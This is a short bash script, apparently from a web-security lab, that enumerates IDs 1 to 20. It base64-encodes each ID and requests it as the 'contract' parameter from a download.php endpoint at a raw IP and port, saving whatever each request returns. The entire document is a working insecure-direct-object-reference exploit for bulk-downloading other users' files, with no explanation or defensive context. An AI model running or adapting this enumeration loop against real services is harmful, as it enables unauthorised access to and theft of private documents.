#!/bin/bash

for i in {1..20}; do
    for hash in $(echo -n $i | base64 ); do
        curl -sOJ --get --data-urlencode "contract=$hash" http://94.237.63.83:48563/download.php
    done
done
